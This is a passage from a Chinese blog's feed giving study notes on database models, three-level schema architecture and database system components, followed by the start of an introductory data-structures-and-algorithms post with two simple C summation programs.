&lt;p&gt;在数据库中定义满足下面两个条件的基本层次联系的集合为层次模型&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;有且只有一个节点没有双亲结点，这个结点被称为根结点&lt;/li&gt;
&lt;li&gt;根以外的其他结点有且只有一个双亲结点&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;每个结点表示一个记录类型，记录类型之间的联系用结点之间的连线表示，这种联系是父子之间的一对多的关系&lt;/p&gt;
&lt;h3 id=&#34;2-层次模型的数据操纵与完整性约束&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-层次模型的数据操纵与完整性约束&#34;&gt;#&lt;/a&gt; 2、层次模型的数据操纵与完整性约束&lt;/h3&gt;
&lt;p&gt;层次模型的数据操纵主要有查询、插入、删除和更新，操纵时要保证层次模型完整性约束条件&lt;/p&gt;
&lt;h3 id=&#34;3-层次模型的优缺点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-层次模型的优缺点&#34;&gt;#&lt;/a&gt; 3、层次模型的优缺点&lt;/h3&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;层次模型的数据结构比较简单清晰&lt;/li&gt;
&lt;li&gt;层次数据库的查询效率高&lt;/li&gt;
&lt;li&gt;层次数据模型提供了良好的完整性支撑&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;现实世界中很多联系是非层次性的，如结点之间具有多对多联系，不适合层次模型表示&lt;/li&gt;
&lt;li&gt;如果一个结点具有多个双亲结点编写很复杂&lt;/li&gt;
&lt;li&gt;查询子女结点必须通过双亲结点&lt;/li&gt;
&lt;li&gt;由于结构严密，层次命令趋于程序化&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;126网状模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#126网状模型&#34;&gt;#&lt;/a&gt; 1.2.6 网状模型&lt;/h2&gt;
&lt;h3 id=&#34;1-网状模型的数据结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-网状模型的数据结构&#34;&gt;#&lt;/a&gt; 1、网状模型的数据结构&lt;/h3&gt;
&lt;p&gt;在数据库中满足下面两个条件的基本层次联系集合称为网状模型&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;允许一个以上的结点无双亲&lt;/li&gt;
&lt;li&gt;一个结点可以有对于一个的双亲&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;2-网状模型的数据操纵与完整性约束&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-网状模型的数据操纵与完整性约束&#34;&gt;#&lt;/a&gt; 2、网状模型的数据操纵与完整性约束&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;支持记录码的概念，码即唯一标识记录的数据项的集合&lt;/li&gt;
&lt;li&gt;保证一个联系中双亲记录和子女记录之间是一对多的关系&lt;/li&gt;
&lt;li&gt;可以支持双亲和子女记录之间&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;3-网状模型的优缺点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-网状模型的优缺点&#34;&gt;#&lt;/a&gt; 3、网状模型的优缺点&lt;/h3&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;能够更为直接的描述现实世界，如一个结点可以有多个双亲，结点之间可以有多种联系&lt;/li&gt;
&lt;li&gt;具有良好的性能，存取效率较高&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;结构比较复杂，而且伴随着应环境的扩大，数据库的结构就变得越来越复杂&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;127关系模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#127关系模型&#34;&gt;#&lt;/a&gt; 1.2.7 关系模型&lt;/h2&gt;
&lt;p&gt;关系数据库系统采用关系模型作为数据的组织方式&lt;/p&gt;
&lt;h3 id=&#34;1-关系数据模型的数据结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-关系数据模型的数据结构&#34;&gt;#&lt;/a&gt; 1、关系数据模型的数据结构&lt;/h3&gt;
&lt;p&gt;在用户观点下，关系模型中数据的逻辑结构是一张二维表，它由行和列组成。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;关系（Relation） 一个关系对应通常说的一张表&lt;/li&gt;
&lt;li&gt;元组（Tuple） 表中的一行即为一个元组&lt;/li&gt;
&lt;li&gt;属性（Attribute）   表中的一列即为一个属性，给每一个属性起一个名称即属性名&lt;/li&gt;
&lt;li&gt;主码（Key） 表中的某个属性组，它可以唯一确定一个元组。&lt;/li&gt;
&lt;li&gt;域（Domain） 属性的取值范围。&lt;/li&gt;
&lt;li&gt;分量 元组中的一个属性值。&lt;/li&gt;
&lt;li&gt;关系模式 对关系的描述&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关系必须是规范化的，满足一定的规范条件&lt;br /&gt;
最基本的规范条件：关系的每一个分量必须是一个不可分的数据项，不允许表中还有表&lt;/p&gt;
&lt;h3 id=&#34;2-关系数据模型的操纵与完整性约束&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-关系数据模型的操纵与完整性约束&#34;&gt;#&lt;/a&gt; 2、关系数据模型的操纵与完整性约束&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;数据操作是集合操作，操作对象和操作结果都是关系&lt;/li&gt;
&lt;li&gt;数据操作是集合操作，操作对象和操作结果都是关系，即若干元组的集合&lt;/li&gt;
&lt;li&gt;存取路径对用户透明 / 隐蔽，用户只要指出 “干什么”，不必详细说明 “怎么干”&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-关系数据模型的优缺点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-关系数据模型的优缺点&#34;&gt;#&lt;/a&gt; 3、关系数据模型的优缺点&lt;/h3&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;建立在严格的数学概念的基础上&lt;/li&gt;
&lt;li&gt;概念单一&lt;br /&gt;
实体和各类联系都用关系来表示&lt;br /&gt;
对数据的检索结果也是关系&lt;/li&gt;
&lt;li&gt;关系模型的存取路径对用户透明&lt;br /&gt;
具有更高的数据独立性，更好的安全保密性&lt;br /&gt;
简化了程序员的工作和数据库开发建立的工作&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;存取路径对用户透明导致查询效率往往不如非关系数据模型&lt;/li&gt;
&lt;li&gt;为提高性能，必须对用户的查询请求进行优化    增加了开发 DBMS 的难度&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;13数据库系统结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#13数据库系统结构&#34;&gt;#&lt;/a&gt; 1.3 数据库系统结构&lt;/h1&gt;
&lt;h3 id=&#34;131数据库系统模式的概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#131数据库系统模式的概念&#34;&gt;#&lt;/a&gt; 1.3.1 数据库系统模式的概念&lt;/h3&gt;
&lt;h4 id=&#34;模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模式&#34;&gt;#&lt;/a&gt; 模式&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;数据库全体数据逻辑结构和特征的描述&lt;/li&gt;
&lt;li&gt;是型的描述&lt;/li&gt;
&lt;li&gt;反映的是数据的结构及其联系&lt;/li&gt;
&lt;li&gt;模式是相对稳定的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;型是对一类型的结构和属性的说明&lt;br /&gt;
值是型的一个具体赋值&lt;/p&gt;
&lt;h3 id=&#34;132数据库系统的三级映像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#132数据库系统的三级映像&#34;&gt;#&lt;/a&gt; 1.3.2 数据库系统的三级映像&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220914203111627.png&#34; alt=&#34;image-20220914203111627&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;1-模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-模式&#34;&gt;#&lt;/a&gt; 1、模式&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;模式也叫逻辑结构&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;数据库中全体数据的逻辑结构和特征的描述&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;所有用户的公共数据视图，综合了所有用户的需求&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个数据库只有一个模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;模式的地位：是数据库系统模式结构的中间层&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;与数据的物理存储细节和硬件环境无关&lt;/li&gt;
&lt;li&gt;与具体的应用程序、开发工具及高级程序设计语言无关&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;逻辑结构：数据记录由哪些数据项组成，数据项的名字，类型，取值范围等，而且要定义数据之间的联系，与数据有关的安全性，完整性操作。&lt;/p&gt;
&lt;h4 id=&#34;2-外模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-外模式&#34;&gt;#&lt;/a&gt; 2、外模式&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;外模式也叫做子模式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;数据库用户（包括应用程序员和最终用户）使用的局部数据的逻辑结构和特征的描述&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据库用户的数据视图，是与某一应用有关的数据的逻辑表示&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;外模式的地位：介于模式与应用之间&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;模式与外模式的关系：一对多&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;外模式是模式的子集，一个数据库可以有多个外模式反应了不同的用户的应用需求、看待数据的方式、对数据保密的要求&lt;/p&gt;
&lt;p&gt;对模式中同一数据，在外模式中的结构、类型、长度、保密级别等都可以不同&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;外模式与应用的关系：一对多&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;同一外模式也可以为某一用户的多个应用系统所使用&lt;br /&gt;
但一个应用程序只能使用一个外模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;外模式的用途&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;保证数据库安全性的一个有力措施&lt;/li&gt;
&lt;li&gt;每个用户只能看见和访问所对应的外模式中的数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;外模式是从模式导出的一个子集，包含模式中允许特定用户使用的那部分数据。用户可以通过外模式描述语言来描述、定义对应于用户的数据记录 (外模式)，也可以利用数据操纵语言 (DML) 对这些数据记录进行。外模式反映了数据库的用户观。&lt;/p&gt;
&lt;h4 id=&#34;3-内模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-内模式&#34;&gt;#&lt;/a&gt; 3、内模式&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;内模式也称为储存模式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;是数据物理结构和储存方式的描述&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;是数据在数据库内部的表示方式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;记录的存储方式（顺序存储，按照 B 树结构存储，按 hash 方法存储）&lt;/li&gt;
&lt;li&gt;索引的组织方式&lt;/li&gt;
&lt;li&gt;数据是否压缩存储&lt;/li&gt;
&lt;li&gt;数据是否加密&lt;/li&gt;
&lt;li&gt;数据存储记录结构的规定&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个数据库只有一个内模式&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;133数据库的二级映像域数据独立性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#133数据库的二级映像域数据独立性&#34;&gt;#&lt;/a&gt; 1.3.3 数据库的二级映像域数据独立性&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;三级模式是对数据的三个抽象级别&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;二级映象在 DBMS 内部实现这三个抽象层次的联系和转换&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;外模式／模式映像&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;模式／内模式映像&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;外模式模式映像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#外模式模式映像&#34;&gt;#&lt;/a&gt; 外模式／模式映像&lt;/h4&gt;
&lt;p&gt;保证数据的逻辑独立性:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当模式改变时，数据库管理员修改有关的外模式 / 模式映象，使外模式保持不变&lt;/li&gt;
&lt;li&gt;应用程序是依据数据的外模式编写的，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;模式内模式映像&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模式内模式映像&#34;&gt;#&lt;/a&gt; 模式／内模式映像&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;模式／内模式映象定义了数据全局逻辑结构与存储结构之间的对应关系。&lt;/li&gt;
&lt;li&gt;数据库中模式／内模式映象是唯一的&lt;/li&gt;
&lt;li&gt;该映象定义通常包含在模式描述中&lt;/li&gt;
&lt;li&gt;保证数据的物理独立性
&lt;ul&gt;
&lt;li&gt;当数据库的存储结构改变了（例如选用了另一种存储结构），数据库管理员修改模式／内模式映象，使模式保持不变&lt;/li&gt;
&lt;li&gt;应用程序不受影响。保证了数据与程序的物理独立性，简称数据的物理独立性。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据库的二级映像
&lt;ul&gt;
&lt;li&gt;保证了数据库外模式的稳定性&lt;/li&gt;
&lt;li&gt;从底层保证了应用程序的稳定性，除非应用需求本身发生变化，否则应用程序一般不需要修改&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据与程序之间的独立性，使得数据的定义和描述可以从应用程序中分离出去&lt;/li&gt;
&lt;li&gt;数据的存取由 DBMS 管理
&lt;ul&gt;
&lt;li&gt;用户不必考虑存取路径等细节&lt;/li&gt;
&lt;li&gt;简化了应用程序的编制&lt;/li&gt;
&lt;li&gt;大大减少了应用程序的维护和修改&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;14数据库系统的组成&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#14数据库系统的组成&#34;&gt;#&lt;/a&gt; 1.4 数据库系统的组成&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;数据库&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据库管理系统（及其开发工具）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;应用系统&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据库管理员&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;硬件平台及数据库&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;足够大的内存 --- 操作系统、DBMS 的核心模块 、数据缓冲区、 应用程序&lt;/li&gt;
&lt;li&gt;足够大的外存 ----- 磁盘或磁盘阵列（数据库）、光盘、磁带（数据备份）&lt;/li&gt;
&lt;li&gt;较高的通道能力，提高数据传送率&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;软件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DBMS&lt;/li&gt;
&lt;li&gt;支持 DBMS 运行的操作系统&lt;/li&gt;
&lt;li&gt;与数据库接口的高级语言及其编译系统&lt;/li&gt;
&lt;li&gt;以 DBMS 为核心的应用开发工具&lt;/li&gt;
&lt;li&gt;为特定应用环境开发的数据库应用系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;人员&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;数据库管理员&lt;/p&gt;
&lt;p&gt;1. 决定数据库中的信息内容和结构&lt;br /&gt;
 2. 决定数据库的存储结构和存取策略&lt;br /&gt;
 3. 定义数据的安全性要求和完整性约束条件&lt;br /&gt;
 4. 监控数据库的使用和运行&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;周期性转储数据库&lt;/li&gt;
&lt;li&gt;系统故障恢复&lt;/li&gt;
&lt;li&gt;介质故障恢复&lt;/li&gt;
&lt;li&gt;监视审计文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;5. 数据库的改进和重组&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;性能监控和调优&lt;/li&gt;
&lt;li&gt;定期对数据库进行重组织，以提高系统的性能&lt;/li&gt;
&lt;li&gt;需求增加和改变时，数据库须需要重构造&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;系统分析员和数据库设计人员&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统分析员&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;负责应用系统的需求分析和规范说明&lt;/li&gt;
&lt;li&gt;与用户及 DBA 协商，确定系统的硬软件配置&lt;/li&gt;
&lt;li&gt;参与数据库系统的概要设计&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;数据库设计人员
&lt;ol&gt;
&lt;li&gt;参加用户需求调查和系统分析&lt;/li&gt;
&lt;li&gt;确定数据库中的数据&lt;/li&gt;
&lt;li&gt;设计数据库各级模式&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;应用程序员&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设计和编写应用系统的程序模块&lt;/li&gt;
&lt;li&gt;进行调试和安装&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;偶然用户&lt;/li&gt;
&lt;li&gt;简单用户&lt;/li&gt;
&lt;li&gt;复杂用户&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
</content>
        <updated>2022-10-23T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://blog.xcu.icu/2022/10/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/</id>
        <title>数据结构与算法入门</title>
        <link rel="alternate" href="https://blog.xcu.icu/2022/10/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%85%A5%E9%97%A8/"/>
        <content type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&#34;1数据结构与算法入门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1数据结构与算法入门&#34;&gt;#&lt;/a&gt; 1，数据结构与算法入门&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;程序=数据结构+算法&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;研究非数值计算的程序设计问题中计算机的操作对象以及它们之间的关系和操作&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因为操作对象和操作对象之间的关系不同产生不同的数据结构&lt;/p&gt;
&lt;h2 id=&#34;算法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#算法&#34;&gt;#&lt;/a&gt; 算法&lt;/h2&gt;
&lt;p&gt;何为算法，使用计算机 C 语言编程计算 1 到 100 的和（1+2+3+……+100）多数会给出这样的答案&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; ans&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
        ans&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%d&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;ans&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;循环计算了一百次，但是如果我们使用等差数列求和&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; ans&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%d&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;ans&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;使用更加简单的方式，用较小的计算量完成计算&lt;/p&gt;
&lt;h3 id=&#34;算法的特性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#算法的特性&#34;&gt;#&lt;/a&gt; 算法的特性&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;输入输出：&lt;br /&gt;
算法具有 0 个或者多个输入，至少一个输出&lt;/li&gt;
&lt;li&gt;确定性：&lt;br /&gt;
算法的每一步都具有确定的含义，无二义性，即相同的输入得到的输出结果相同&lt;/li&gt;
&lt;li&gt;有穷性&lt;br /&gt;
每个算法都应该在有限的时间内完成&lt;/li&gt;
&lt;li&gt;可行性&lt;br /&gt;
一个算法是可以被执行的，即算法的每个操作都可以通过已经实现的基本运算执行有限次数来完成&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;算法的设计要求&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#算法的设计要求&#34;&gt;#&lt;/a&gt; 算法的设计要求&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;正确性：算法能够满足指定的功能，能够得到正确答案&lt;/li&gt;
&lt;li&gt;健壮性：当输入的数据不合法时，也能够做出相应的处理&lt;/li&gt;
&lt;li&gt;可读性：指算法是可以阅读，理解和交流的&lt;/li&gt;
&lt;li&gt;耗时低占用空间少（高效性）：运行时间（Running time）与占用空间（Storage space）概念，在设计算法时，我们总是希望能够更少的使用时间和空间达成我们的目标。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;基本概念和术语&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本概念和术语&#34;&gt;#&lt;/a&gt; 基本概念和术语&lt;/h2&gt;
&lt;p&gt;数据是信息的载体，是可以被计算机识别，存储并加工处理的描述客观事物的信息符号的总称&lt;/p&gt;
&lt;p&gt;数据元素是数据的基本单位，数据元素由若干数据项组成&lt;br /&gt;
数据项是构成数据元素的最小单位&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220905152622667.png&#34; alt=&#34;image-20220905152622667&#34; /&gt;&lt;/p&gt;
&lt;p&gt;数据对象：相同性质数据元素的集合，是数据的一个子集&lt;/p&gt;
&lt;p&gt;数据结构：数据结构 = 数据对象 + 结构（带结构的数据对象）&lt;br /&gt;
数据对象不是孤立存在的，他们之间存在某种关系，数据对象之间的关系成为结构&lt;/p&gt;
&lt;h2 id=&#34;数据结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据结构&#34;&gt;#&lt;/a&gt; 数据结构&lt;/h2&gt;
&lt;p&gt;数据结构的两个层次：&lt;/p&gt;
&lt;p&gt;1、逻辑结构&lt;/p&gt;
&lt;ol&gt;
